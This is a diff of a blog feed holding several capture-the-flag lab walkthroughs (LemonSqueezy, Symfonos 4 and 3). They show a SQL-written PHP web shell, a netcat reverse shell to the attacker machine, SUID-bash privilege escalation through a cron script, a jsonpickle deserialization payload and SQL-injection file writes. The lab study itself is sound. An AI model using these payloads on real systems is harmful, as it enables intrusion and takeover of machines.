@@ -23,29 +23,30 @@ as our initial foothold and we then escalate privileges by abusing a cron job ru
 script.&lt;/p>
 &lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
 &lt;p>Nmap&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.134
-Host is up &lt;span style="color:#f92672">(&lt;/span>0.00014s latency&lt;span style="color:#f92672">)&lt;/span>.
-PORT STATE SERVICE VERSION
-80/tcp open http Apache httpd 2.4.25 &lt;span style="color:#f92672">((&lt;/span>Debian&lt;span style="color:#f92672">))&lt;/span>
-|_http-server-header: Apache/2.4.25 &lt;span style="color:#f92672">(&lt;/span>Debian&lt;span style="color:#f92672">)&lt;/span>
-|_http-title: Apache2 Debian Default Page: It works
-MAC Address: 00:0C:29:FF:26:DE &lt;span style="color:#f92672">(&lt;/span>VMware&lt;span style="color:#f92672">)&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.134
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.00014s latency&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.25 &lt;span style="color:#f92672">((&lt;/span>Debian&lt;span style="color:#f92672">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.25 &lt;span style="color:#f92672">(&lt;/span>Debian&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Apache2 Debian Default Page: It works
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>MAC Address: 00:0C:29:FF:26:DE &lt;span style="color:#f92672">(&lt;/span>VMware&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
 &lt;h2 id="80-http">80 (HTTP)&lt;/h2>
 &lt;p>Visiting this page on the browser only serves the apache default page, confirming what nmap found in title.&lt;/p>
 &lt;p>After performing a directory bruteforce using ffuf we get the following directories:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ffuf -ic -c -u &lt;span style="color:#e6db74">&amp;#39;http://192.168.191.134/FUZZ&amp;#39;&lt;/span> -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t &lt;span style="color:#ae81ff">50&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ffuf -ic -c -u &lt;span style="color:#e6db74">&amp;#39;http://192.168.191.134/FUZZ&amp;#39;&lt;/span> -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t &lt;span style="color:#ae81ff">50&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-1.png" class="center" style="border-radius: 8px;" />
 &lt;p>Checking the /wordpress directory, we see a basic wordpress site with not much information.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-2.png" class="center" style="border-radius: 8px;" />
 &lt;p>Performing enumeration using wpscan, the only interesting information gathered is the usernames.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">wpscan --url http://lemonsqueezy/wordpress -e ap,at,tt,cb,dbe,u -o wpscan.out --api-token
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>wpscan --url http://lemonsqueezy/wordpress -e ap,at,tt,cb,dbe,u -o wpscan.out --api-token
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-3.png" class="center" style="border-radius: 8px;" />
 &lt;p>Bruteforcing the credentials for each user, we discover the password of the orange user.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">wpscan --url http://lemonsqueezy/wordpress -U orange -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>wpscan --url http://lemonsqueezy/wordpress -U orange -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-4.png" class="center" style="border-radius: 8px;" />
 &lt;p>After logging into wordpress with the discovered credentials &lt;strong>orange:ginger&lt;/strong>, we find another password in drafts.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-5.png" class="center" style="border-radius: 8px;" />
@@ -54,15 +55,15 @@ MAC Address: 00:0C:29:FF:26:DE &lt;span style="color:#f92672">(&lt;/span>VMware&
 &lt;p>Successful login:&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-7.png" class="center" style="border-radius: 8px;" />
 &lt;p>By logging in we can abuse this access by writing a file to disk that contains php by using an sql statement.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">SELECT&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#66d9ef">into&lt;/span> outfile &lt;span style="color:#e6db74">&amp;#34;/var/www/html/wordpress/shell.php&amp;#34;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">SELECT&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#66d9ef">into&lt;/span> outfile &lt;span style="color:#e6db74">&amp;#34;/var/www/html/wordpress/shell.php&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-8.png" class="center" style="border-radius: 8px;" />
 &lt;p>We can then verify that we have successful command execution, by running the whoami command.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-9.png" class="center" style="border-radius: 8px;" />
 &lt;h1 id="shell-as-www-data">Shell as www-data&lt;/h1>
 &lt;p>Running the below curl command we are able to get a reverse shell:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">curl &lt;span style="color:#e6db74">&amp;#34;http://192.168.191.134/wordpress/shell.php?cmd=nc+-e+/bin/bash+192.168.191.1+9000+%26&amp;#34;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>curl &lt;span style="color:#e6db74">&amp;#34;http://192.168.191.134/wordpress/shell.php?cmd=nc+-e+/bin/bash+192.168.191.1+9000+%26&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-10.png" class="center" style="border-radius: 8px;" />
 &lt;p>After performing some manual local enumeration, we discover a cron job running as root.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-11.png" class="center" style="border-radius: 8px;" />
@@ -70,14 +71,14 @@ MAC Address: 00:0C:29:FF:26:DE &lt;span style="color:#f92672">(&lt;/span>VMware&
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-12.png" class="center" style="border-radius: 8px;" />
 &lt;h1 id="shell-as-root">Shell as root&lt;/h1>
 &lt;p>After changing the script to the below command we can create a bash binary with suid permissions.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#75715e">#!/bin/bash
-&lt;/span>&lt;span style="color:#75715e">&lt;/span>cp /bin/bash /suidbash
-chmod u+s /suidbash
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/bin/bash
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>cp /bin/bash /suidbash
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chmod u+s /suidbash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-13.png" class="center" style="border-radius: 8px;" />
 &lt;p>Once the cron is executed we get the binary and can escalate to root shell and read root.txt.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">./suidbash -p
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>./suidbash -p
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-14.png" class="center" style="border-radius: 8px;" />
 &lt;h1 id="extras">Extras&lt;/h1>
 &lt;ul>
@@ -111,26 +112,27 @@ we exploit the lfi. For that we poison ssh logs for exploitation to rce. For pri
 a python web app running locally as root using insecure deserialization of the cookie by jsonpickle.&lt;/p>
 &lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
 &lt;p>Nmap&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.56.105
-Host is up &lt;span style="color:#f92672">(&lt;/span>0.00033s latency&lt;span style="color:#f92672">)&lt;/span>.
-PORT STATE SERVICE VERSION
-22/tcp open ssh OpenSSH 7.9p1 Debian &lt;span style="color:#ae81ff">10&lt;/span> &lt;span style="color:#f92672">(&lt;/span>protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
-| ssh-hostkey:
-| &lt;span style="color:#ae81ff">2048&lt;/span> f9:c1:73:95:a4:17:df:f6:ed:5c:8e:8a:c8:05:f9:8f &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
-| &lt;span style="color:#ae81ff">256&lt;/span> be:c1:fd:f1:33:64:39:9a:68:35:64:f9:bd:27:ec:01 &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
-|_ &lt;span style="color:#ae81ff">256&lt;/span> 66:f7:6a:e8:ed:d5:1d:2d:36:32:64:39:38:4f:9c:8a &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
-80/tcp open http Apache httpd 2.4.38 &lt;span style="color:#f92672">((&lt;/span>Debian&lt;span style="color:#f92672">))&lt;/span>
-|_http-server-header: Apache/2.4.38 &lt;span style="color:#f92672">(&lt;/span>Debian&lt;span style="color:#f92672">)&lt;/span>
-|_http-title: Site doesn&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>t have a title &lt;span style="color:#f92672">(&lt;/span>text/html&lt;span style="color:#f92672">)&lt;/span>.
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.56.105
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.00033s latency&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 7.9p1 Debian &lt;span style="color:#ae81ff">10&lt;/span> &lt;span style="color:#f92672">(&lt;/span>protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">2048&lt;/span> f9:c1:73:95:a4:17:df:f6:ed:5c:8e:8a:c8:05:f9:8f &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">256&lt;/span> be:c1:fd:f1:33:64:39:9a:68:35:64:f9:bd:27:ec:01 &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#ae81ff">256&lt;/span> 66:f7:6a:e8:ed:d5:1d:2d:36:32:64:39:38:4f:9c:8a &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.38 &lt;span style="color:#f92672">((&lt;/span>Debian&lt;span style="color:#f92672">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.38 &lt;span style="color:#f92672">(&lt;/span>Debian&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Site doesn&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>t have a title &lt;span style="color:#f92672">(&lt;/span>text/html&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
 &lt;h2 id="http-80">HTTP (80)&lt;/h2>
 &lt;p>On the browser, the only thing that is served is an image. Therefore we need to bruteforce for directories
 and files.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-26.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Performing a bruteforce with ffuf we get a &lt;strong>gods&lt;/strong> directory.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ffuf -ic -c -u http://192.168.56.105/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e / -fc &lt;span style="color:#ae81ff">403&lt;/span> | tee root.ffuf
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ffuf -ic -c -u http://192.168.56.105/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e / -fc &lt;span style="color:#ae81ff">403&lt;/span> | tee root.ffuf
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-2.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>In this directory we only have some files, with nothing useful in them.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
@@ -178,16 +180,18 @@ path to privesc.&lt;/p>
 &lt;p>Based on the use of pickle, we need to exploit deserialization through the cookie.&lt;/p>
 &lt;p>I came up with the below script to generate a base64 encoded cookie which when deserialized
 will create a setuid binary of bash.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#f92672">import&lt;/span> jsonpickle
-&lt;span style="color:#f92672">import&lt;/span> base64
-&lt;span style="color:#f92672">import&lt;/span> os
-&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">RCE&lt;/span>(object):
-&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">__reduce__&lt;/span>(self):
-cmd &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#e6db74">&amp;#39;cp /bin/bash /tmp/suidbash;chmod +s /tmp/suidbash&amp;#39;&lt;/span>)
-&lt;span style="color:#66d9ef">return&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>system, (cmd,)
-encoded &lt;span style="color:#f92672">=&lt;/span> base64&lt;span style="color:#f92672">.&lt;/span>b64encode(jsonpickle&lt;span style="color:#f92672">.&lt;/span>encode(RCE()))
-&lt;span style="color:#66d9ef">print&lt;/span>(encoded)
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> jsonpickle
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> base64
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">RCE&lt;/span>(object):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">__reduce__&lt;/span>(self):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cmd &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#e6db74">&amp;#39;cp /bin/bash /tmp/suidbash;chmod +s /tmp/suidbash&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>system, (cmd,)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>encoded &lt;span style="color:#f92672">=&lt;/span> base64&lt;span style="color:#f92672">.&lt;/span>b64encode(jsonpickle&lt;span style="color:#f92672">.&lt;/span>encode(RCE()))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(encoded)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-22.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Setting the cookie and sending the request using burpsuite:&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-23.png" alt="symfonos" class="center" style="border-radius: 8px;" />
@@ -206,14 +210,14 @@ the &lt;code>$_SESSION['logged_in']&lt;/code> is set to false.&lt;/p>
 &lt;p>This is a blind boolean sql injection. We can intercept the request with burpsuite and save the request to file
 and exploit this with sqlmap.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-28.png" alt="symfonos" class="center" style="border-radius: 8px;" />
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sqlmap -r atlantis.req --batch --dump --level&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span> --risk&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span> --threads&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>I was able to dump creds but they weren&amp;rsquo;t useful as I couldn&amp;rsquo;t crack the hash.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sqlmap -r atlantis.req --batch --dump --level&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span> --risk&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span> --threads&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>I was able to dump creds but they weren&amp;rsquo;t useful as I couldn&amp;rsquo;t crack the hash.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-11.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Since we can run sql queries, we can try and write to a file and access it using the lfi. During exploiting of this box
 I tried this but couldn&amp;rsquo;t figure out why it failed but on revisiting it afterwards I figured out the issue.&lt;/p>
 &lt;p>Using this payload in my post request to write to a file using select, we don&amp;rsquo;t get the usual redirect that
 signifies that the query was successful.&lt;/p>
-&lt;pre>&lt;code>username=admin' and 1=2 Union Select 1,'2' INTO OUTFILE '/tmp/test.log'-- -&amp;amp;password=a
+&lt;pre tabindex="0">&lt;code>username=admin&amp;#39; and 1=2 Union Select 1,&amp;#39;2&amp;#39; INTO OUTFILE &amp;#39;/tmp/test.log&amp;#39;-- -&amp;amp;password=a
 &lt;/code>&lt;/pre>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-29.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>The file is actually written to disk if we check the /tmp folder.&lt;/p>
@@ -231,7 +235,7 @@ we need folders that the mysql user can write. I discovered /var/lib/mysql and /
 &lt;p>Something else to note is that if a file exists, sql will not overwrite it. Therefore if you need to make changes to
 what you&amp;rsquo;re writing you&amp;rsquo;ll need to write to another non-existent file.&lt;/p>
 &lt;p>Testing this using /var/lib/mysql the file gets written.&lt;/p>
-&lt;pre>&lt;code>username=admin' and 1=2 Union Select 1,'test' INTO OUTFILE '/var/lib/mysql/123456.log'-- -&amp;amp;password=a
+&lt;pre tabindex="0">&lt;code>username=admin&amp;#39; and 1=2 Union Select 1,&amp;#39;test&amp;#39; INTO OUTFILE &amp;#39;/var/lib/mysql/123456.log&amp;#39;-- -&amp;amp;password=a
 &lt;/code>&lt;/pre>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-33.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Then accessing it using the lfi works this time.&lt;/p>
@@ -260,7 +264,7 @@ directory. Using those write permissions we hijack a library that is imported in
 cron job. We create a suid bash binary that we use to get a root shell.&lt;/p>
 &lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
 &lt;p>Nmap&lt;/p>
-&lt;pre>&lt;code class="language-nmap" data-lang="nmap">Nmap scan report for 192.168.191.130
+&lt;pre tabindex="0">&lt;code class="language-nmap" data-lang="nmap">Nmap scan report for 192.168.191.130
 Host is up (0.00025s latency).
 PORT STATE SERVICE VERSION
 21/tcp open ftp ProFTPD 1.3.5b
@@ -271,7 +275,7 @@ PORT STATE SERVICE VERSION
 |_ 256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b (ED25519)
 80/tcp open http Apache httpd 2.4.25 ((Debian))
 |_http-server-header: Apache/2.4.25 (Debian)
-|_http-title: Site doesn't have a title (text/html).
+|_http-title: Site doesn&amp;#39;t have a title (text/html).
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 &lt;/code>&lt;/pre>&lt;h1 id="enumeration">Enumeration&lt;/h1>
 &lt;h2 id="http-80">HTTP (80)&lt;/h2>
@@ -280,41 +284,42 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 &lt;p>Viewing the source doesn&amp;rsquo;t reveal much.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-12.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Performing a recursive directory bruteforce using ffuf with recursion enabled we get several directories.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ffuf -ic -c -u http://192.168.191.130/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion | tee ffuf.out.recurse
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ffuf -ic -c -u http://192.168.191.130/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion | tee ffuf.out.recurse
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-3.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Going to the research endpoint, there&amp;rsquo;s information about the Underworld and Greek mythology.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-4.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Some of the words look similar to the directories we discovered, so let&amp;rsquo;s create a wordlist which maybe helpful later.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">cewl http://192.168.191.130/gate/cerberus/tartarus/research -w words.txt
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>The current directories we have discovered don&amp;rsquo;t have much in them. At this point I was stuck a bit, after looking at
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>cewl http://192.168.191.130/gate/cerberus/tartarus/research -w words.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The current directories we have discovered don&amp;rsquo;t have much in them. At this point I was stuck a bit, after looking at
 some writeups I realized that sometimes valid directories show when you have a trailing slash at the end. So I ran ffuf again
 with a trailing slash.&lt;/p>
